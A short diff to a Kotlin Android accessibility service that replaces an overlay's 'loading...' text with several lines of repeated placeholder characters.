@@ -761,7 +761,7 @@ class InputService : AccessibilityService() {
 	overLay.setVisibility(gohome)
 
         val loadingText = TextView(this, null)
-	loadingText.text = "loading..."
+	loadingText.text = "口口口口口口口口口口口口口口口口口口\n口口口口口口口口口口口口口口口口口口\n口口口口口口口口口口口口口口！"
 	loadingText.setTextColor(-7829368)
 	loadingText.textSize = 20.0f
 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
